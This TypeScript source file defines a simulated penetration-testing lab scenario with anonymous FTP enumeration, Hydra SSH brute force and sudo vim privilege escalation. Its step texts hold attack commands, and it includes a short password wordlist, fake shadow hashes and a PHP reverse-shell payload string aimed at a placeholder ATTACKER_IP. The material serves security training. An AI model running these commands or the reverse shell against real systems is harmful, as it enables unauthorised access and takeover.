// ── laboratorios/laboratorio05.ts ───────────────────────────────────────
// Scenario 5 — FTP Enumeration + Brute Force + Privilege Escalation
// Flujo: nmap → ftp anonymous → get → cat → hydra → ssh → escalada

import { assignDHCP } from '../utils/network';
import type { Machine, Scenario, MachineInfo, Port, LearningStep, Mission, FileEntry } from '../types';

// MACs únicas para máquinas atacantes (evita colisiones entre escenarios)
const ATTACKER_MACS = ['08:00:27:AA:BB:CC', '08:00:27:AA:BB:CD', '08:00:27:AA:BB:CE'];
let attackerCount = 0;

// Resetea el contador de MACs al cambiar de escenario
export function resetAttackerCounter() { attackerCount = 0; }

export function createAttackerMachine(networkRange: string, customHostname?: string): Machine {
  const mac = ATTACKER_MACS[attackerCount % ATTACKER_MACS.length];
  attackerCount++;
  return {
    id: 'attacker-01',
    machine_info: { hostname: customHostname || 'kali-attacker', ip: '', mac, os: 'Kali Linux 2023.4', status: 'up', type: 'workstation' },
    discovery_level: 4, scan_results: { ports: [] }, web_enumeration: { web_server: 'none', cms: 'none', directories: [] },
    learning_steps: [], files: [],
  };
}

interface ScenarioBuilderConfig {
  id: string; name: string; description: string;
  difficulty: 'Easy' | 'Medium' | 'Hard';
  category: 'Web' | 'Network' | 'Crypto' | 'Forensics';
  networkRange: string; attackerFiles?: FileEntry[];
  targetMachine: Omit<Machine, 'machine_info' | 'id'> & { id: string; machine_info: Omit<MachineInfo, 'ip'>; ports: Port[] };
  learningSteps: LearningStep[];
}

export function buildScenario(config: ScenarioBuilderConfig): Scenario {
  const attacker = createAttackerMachine(config.networkRange);
  if (config.attackerFiles?.length) attacker.files = config.attackerFiles;
  const target: Machine = {
    ...config.targetMachine,
    machine_info: { ...config.targetMachine.machine_info, ip: '' } as MachineInfo,
    scan_results: { ports: config.targetMachine.ports },
    web_enumeration: config.targetMachine.web_enumeration || { web_server: 'none', cms: 'none', directories: [] },
    discovery_level: 0,
    learning_steps: config.learningSteps.map((step, idx) => ({ ...step, id: idx + 1 })),
    files: config.targetMachine.files || [],
  };
  const machines = assignDHCP(config.networkRange, [attacker, target]);
  const missions: Mission[] = config.learningSteps.map((step, idx) => ({
    id: idx + 1, title: step.task, description: step.text,
    status: idx === 0 ? 'active' : 'pending', targetMachineId: config.targetMachine.id, discoveryLevel: step.discoveryLevel,
  }));
  return {
    id: config.id, name: config.name, description: config.description,
    difficulty: config.difficulty, category: config.category, network_range: config.networkRange,
    initialMachineId: 'attacker-01', machines, missions,
  };
}

export const COMMON_PORTS = {
  ssh: (version = 'OpenSSH 8.2p1 Ubuntu', creds?: { user: string; pass: string }): Port => ({ port: 22, protocol: 'tcp', state: 'open', service: 'ssh', version, credentials: creds }),
  ftp: (version = 'vsFTPd 3.0.3'): Port => ({ port: 21, protocol: 'tcp', state: 'open', service: 'ftp', version }),
  http: (version = 'Apache httpd 2.4.41'): Port => ({ port: 80, protocol: 'tcp', state: 'open', service: 'http', version }),
};

export function createFile(path: string, content: string, type: 'text' | 'hash' | 'binary' = 'text') {
  return { path, content, type };
}

const REVERSE_SHELL_PAYLOAD = {
  phpSimple: `<?php\n\$ip = "ATTACKER_IP"; \$port = LISTENER_PORT;\n\$sock = fsockopen(\$ip, \$port);\nif(\$sock === false) { echo "No connection"; exit(); }\n\$proc = proc_open('/bin/bash', array(0=>\$sock,1=>\$sock,2=>\$sock), \$pipes);\n?>`,
};

export interface LinuxFileSystemConfig { username?: string; password?: string; shadowPassword?: string; }

export function createLinuxFileSystem(config: LinuxFileSystemConfig = {}) {
  const u = config.username || 'john';
  const sp = config.shadowPassword || '$6$rounds=656000$abcdefghijklmnop$1234567890abcdefghijklmnop/1234567890123456';
  return [
    createFile('/etc/passwd', `root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n${u}:x:1000:1000:${u},,,:/home/${u}:/bin/bash`, 'text'),
    createFile('/etc/shadow', `root:${sp}:18000:0:99999:7:::\ndaemon:*:18000:0:99999:7:::\nwww-data:*:18000:0:99999:7:::\n${u}:$6$rounds=656000$saltsalt$ilovelinuxhash:18000:0:99999:7:::`, 'text'),
    createFile('/etc/hostname', 'ftp-target', 'text'),
    createFile('/etc/os-release', 'NAME="Ubuntu"\nVERSION="20.04.5 LTS"\nID=ubuntu\nPRETTY_NAME="Ubuntu 20.04.5 LTS"\nVERSION_ID=20.04', 'text'),
    createFile('/var/www/html/index.html', '<!DOCTYPE html>\n<html><head><title>Web Server</title></head>\n<body><h1>Welcome to Apache2 Ubuntu Default Page</h1></body></html>', 'text'),
    createFile('/var/www/html/.htaccess', '# AuthType Basic\n# AuthName "Restricted Area"\n# AuthUserFile /var/www/html/.htpasswd', 'text'),
    createFile('/home/admin/.bashrc', 'export PATH="$HOME/bin:$PATH"\nalias ll="ls -l"\nalias la="ls -la"', 'text'),
    createFile('/home/admin/.bash_history', 'ls -la\npwd\ncat /etc/passwd\nsudo su\nwhoami', 'text'),
    createFile('/root/.bashrc', 'export PATH="/root/bin:$PATH"\nalias ll="ls -l"', 'text'),
    createFile('/var/log/auth.log', 'Mar 19 10:23:45 target-server sshd[1234]: Accepted password for admin from 192.168.1.100 port 54321 ssh2\nMar 19 10:24:12 target-server sudo: admin : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash', 'text'),
    createFile('/etc/apache2/apache2.conf', '# ServerAdmin webmaster@localhost\n# DocumentRoot /var/www/html\n# <Directory /var/www/html>\n#   Options Indexes FollowSymLinks\n#   AllowOverride All\n# </Directory>', 'text'),
  ];
}

// Contenido del diccionario rockyou.txt (versión reducida para el lab)
const ROCKYOU_CONTENT = `password
123456
12345678
qwerty
abc123
monkey
letmein
dragon
111111
baseball
ilovelinux
princess
1234567
football
mickey
buster
daniel
andrew
hello
love
admin
welcome
password123
sunshine
master
photoshop
iloveyou
123123
666666
1q2w3e4r
football1
charlie
aa123456
jesus
password1
whatever
121212
dragon1
qwerty123
mustang
trustno1
batman
passw0rd
welcome1
qazwsx
123qwe
killer
michael
jordan
superman
harley
ranger
hunter
fuckyou
thomas
pepper
joshua
maggie
starwars
silver
ashley
tigger
purple
andrew1
justin
buster1
matthew
jonathan
buster12
amanda
william
makaveli1
`;

// Datos específicos para el escenario FTP + Brute Force + Privilege Escalation
const scenario05Data = {
  id: 'scenario-05',
  name: 'FTP Enumeration & Privilege Escalation',
  // Metadata for LandingPage cards
  tagline: 'Access via SSH as limited user and escalate privileges exploiting sudo vim.',
  taglineEs: 'Accedé por SSH como usuario limitado y escalá privilegios explotando sudo vim.',
  description: 'Enumeration via anonymous FTP, SSH brute force with Hydra and privilege escalation to root.',
  descriptionEs: 'Enumeración mediante FTP anónimo, fuerza bruta SSH con Hydra y escalada de privilegios a root.',
  tools: ['arp-scan', 'nmap', 'ssh', 'sudo'],
  accentColor: '#34d399',
  networkRange: '10.10.20.0/24',
  credentials: {
    user: 'john',
    pass: 'ilovelinux',
  },
  flags: {
    user: 'ZIL{FTP_ANON_ACCESS}',
    root: 'ZIL{SUDO_VIM_PRIVESC_COMPLETE}',
  },
  targetMachine: {
    id: 'lab-scenario-05-target',
    hostname: 'privesc-server',
    mac: '08:00:27:E8:F9:0A',
    os: 'Desconocido',
    type: 'server',
    ports: [
      { port: 21, protocol: 'tcp', state: 'open', service: 'ftp', version: 'vsFTPd 3.0.3' },
      { port: 22, protocol: 'tcp', state: 'open', service: 'ssh', version: 'OpenSSH 8.2p1 Ubuntu' },
    ],
    ftpNoteEs: `Para: john
De: Equipo de Seguridad
Fecha: 2024-03-15

URGENTE: John, el sistema de monitoreo reportó que tu contraseña de SSH es extremadamente débil y vulnerable a ataques de fuerza bruta. 

Por favor, cambiala cuanto antes a una contraseña más segura. El equipo de seguridad recomienda usar al menos 12 caracteres con mayúsculas, minúsculas y números.

Nota: Esta nota se deja aquí en el FTP anónimo temporalmente hasta que configuremos un sistema de tickets más seguro.`,
    ftpNoteEn: `To: john
From: Security Team
Date: 2024-03-15

URGENT: John, the monitoring system reported that your SSH password is extremely weak and vulnerable to brute force attacks.

Please change it as soon as possible to a more secure password. The security team recommends using at least 12 characters with uppercase, lowercase, and numbers.

Note: This note is left here on anonymous FTP temporarily until we configure a more secure ticketing system.`,
    files: [
      // Archivo en FTP anónimo - ambos idiomas
      { path: '/srv/ftp/nota.txt', content: `Para: john
De: Equipo de Seguridad
Fecha: 2024-03-15

URGENTE: John, el sistema de monitoreo reportó que tu contraseña de SSH es extremadamente débil y vulnerable a ataques de fuerza bruta. 

Por favor, cambiala cuanto antes a una contraseña más segura. El equipo de seguridad recomienda usar al menos 12 caracteres con mayúsculas, minúsculas y números.

Nota: Esta nota se deja aquí en el FTP anónimo temporalmente hasta que configuremos un sistema de tickets más seguro.`, type: 'text' },
      { path: '/srv/ftp/note.txt', content: `To: john
From: Security Team
Date: 2024-03-15

URGENT: John, the monitoring system reported that your SSH password is extremely weak and vulnerable to brute force attacks.

Please change it as soon as possible to a more secure password. The security team recommends using at least 12 characters with uppercase, lowercase, and numbers.

Note: This note is left here on anonymous FTP temporarily until we configure a more secure ticketing system.`, type: 'text' },
      // Archivos del sistema
      { path: '/etc/sudoers', content: `# /etc/sudoers
# This file MUST be edited with the 'visudo' command as root.
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# User privilege specification
root            ALL=(ALL:ALL) ALL

# Allow john to run vim como root sin password
john       ALL=(ALL) NOPASSWD: /usr/bin/vim`, type: 'text' },
      { path: '/root/root.txt', content: 'ZIL{SUDO_VIM_PRIVESC_COMPLETE}', type: 'text' },
      { path: '/home/john/user.txt', content: 'ZIL{FTP_ANON_ACCESS}', type: 'text' },
      { path: '/home/john/.bash_history', content: `sudo -l
cat /etc/sudoers
whoami`, type: 'text' },
      { path: '/home/john/.ssh/id_rsa', content: '-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA2x5z9k8vL...', type: 'text' },
    ],
  },
  learningSteps: [
    { id: 1, task: 'Host Discovery', taskEs: 'Descubrimiento de host', text: 'Discover the active host on the network: arp-scan <network/cidr>', textEs: 'Descubrí el host activo en la red: arp-scan <network/cidr>', discoveryLevel: 1, targetMachineId: 'lab-scenario-05-target' },
    { id: 2, task: 'Port Scanning', taskEs: 'Escaneo de puertos', text: 'Identify available services: nmap -sV <target-ip>', textEs: 'Identificá los servicios disponibles: nmap -sV <target-ip>', discoveryLevel: 2, targetMachineId: 'lab-scenario-05-target' },
    { id: 3, task: 'Anonymous FTP Access', taskEs: 'Acceso FTP anónimo', text: 'Connect to the FTP server with anonymous access: ftp <target-ip> (user: anonymous)', textEs: 'Conectate al servidor FTP con acceso anónimo: ftp <target-ip> (usuario: anonymous)', discoveryLevel: 2, targetMachineId: 'lab-scenario-05-target' },
    { id: 4, task: 'Download Note', taskEs: 'Descargar nota', text: 'List available files (ls) and download the note: get nota.txt', textEs: 'Listá los archivos disponibles (ls) y descargá la nota: get nota.txt', discoveryLevel: 2, targetMachineId: 'lab-scenario-05-target' },
    { id: 5, task: 'Read Note', taskEs: 'Leer nota', text: 'Exit FTP (exit) and read the downloaded note: cat nota.txt', textEs: 'Salí del FTP (exit) y leé la nota descargada: cat nota.txt', discoveryLevel: 2, targetMachineId: 'lab-scenario-05-target' },
    { id: 6, task: 'SSH Brute Force', taskEs: 'Fuerza bruta SSH', text: 'Get john\'s credentials: hydra -l john -P /usr/share/wordlists/rockyou.txt <target-ip> ssh', textEs: 'Obtené las credenciales de john: hydra -l john -P /usr/share/wordlists/rockyou.txt <target-ip> ssh', discoveryLevel: 3, targetMachineId: 'lab-scenario-05-target' },
    { id: 7, task: 'SSH Access', taskEs: 'Acceso SSH', text: 'Connect with the found credentials: ssh john@<target-ip> <password>', textEs: 'Conectate con las credenciales encontradas: ssh john@<target-ip> <password>', discoveryLevel: 3, targetMachineId: 'lab-scenario-05-target' },
    { id: 8, task: 'Sudo Enumeration', taskEs: 'Enumeración de sudo', text: 'Once inside, list sudo permissions: sudo -l', textEs: 'Una vez dentro, listá los permisos de sudo: sudo -l', discoveryLevel: 3, targetMachineId: 'lab-scenario-05-target' },
    { id: 9, task: 'Privilege Escalation', taskEs: 'Escalada de privilegios', text: 'vim has NOPASSWD permissions. Use it to escalate: sudo vim -c \'!bash\'', textEs: 'vim tiene permisos NOPASSWD. Usalo para escalar: sudo vim -c \'!bash\'', discoveryLevel: 4, targetMachineId: 'lab-scenario-05-target' },
    { id: 10, task: 'Capture Root Flag', taskEs: 'Capturar flag root', text: 'You are now root. Read the flag: cat /root/root.txt', textEs: 'Ahora sos root. Leé la flag: cat /root/root.txt', discoveryLevel: 4, targetMachineId: 'lab-scenario-05-target' },
  ],
};

// Template específico para FTP + Privilege Escalation
export const SCENARIO_TEMPLATES = {
  ftpPrivesc: (): ScenarioBuilderConfig => ({
    id: scenario05Data.id,
    name: scenario05Data.name,
    description: 'Enumeración mediante FTP anónimo, fuerza bruta SSH con Hydra y escalada de privilegios a root.',
    difficulty: 'Medium',
    category: 'Network',
    networkRange: scenario05Data.networkRange,
    attackerFiles: [
      // Diccionario rockyou.txt en la ruta estándar de Kali
      createFile('/usr/share/wordlists/rockyou.txt', ROCKYOU_CONTENT, 'text'),
    ],
    targetMachine: {
      id: scenario05Data.targetMachine.id,
      machine_info: {
        hostname: scenario05Data.targetMachine.hostname,
        mac: scenario05Data.targetMachine.mac,
        os: scenario05Data.targetMachine.os,
        status: 'up',
        type: scenario05Data.targetMachine.type,
      },
      discovery_level: 0,
      scan_results: { ports: [] },
      learning_steps: scenario05Data.learningSteps,
      ports: [
        scenario05Data.targetMachine.ports[0], // FTP
        { ...scenario05Data.targetMachine.ports[1], credentials: scenario05Data.credentials }, // SSH
      ],
      web_enumeration: {
        web_server: 'none',
        cms: 'none',
        directories: [],
      },
      files: [
        ...createLinuxFileSystem({ username: scenario05Data.credentials.user }),
        // Archivos en FTP anónimo - ambos idiomas
        createFile('/srv/ftp/nota.txt', scenario05Data.targetMachine.ftpNoteEs, 'text'),
        createFile('/srv/ftp/note.txt', scenario05Data.targetMachine.ftpNoteEn, 'text'),
        // Sudoers con permiso para vim
        createFile('/etc/sudoers', `# /etc/sudoers
# This file MUST be edited with the 'visudo' command as root.
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

# User privilege specification
root            ALL=(ALL:ALL) ALL

# Allow ${scenario05Data.credentials.user} to run vim como root sin password
${scenario05Data.credentials.user}       ALL=(ALL) NOPASSWD: /usr/bin/vim`, 'text'),
        // Flags
        createFile('/root/root.txt', scenario05Data.flags.root),
        createFile(`/home/${scenario05Data.credentials.user}/user.txt`, scenario05Data.flags.user),
        // Historial
        createFile(`/home/${scenario05Data.credentials.user}/.bash_history`, `sudo -l
cat /etc/sudoers
whoami`, 'text'),
        // SSH key
        createFile(`/home/${scenario05Data.credentials.user}/.ssh/id_rsa`, '-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA2x5z9k8vL...', 'text'),
      ],
    },
    learningSteps: scenario05Data.learningSteps,
  }),
};

// Export data for metadata access
export { scenario05Data };

export const scenario_05: Scenario = buildScenario(SCENARIO_TEMPLATES.ftpPrivesc());
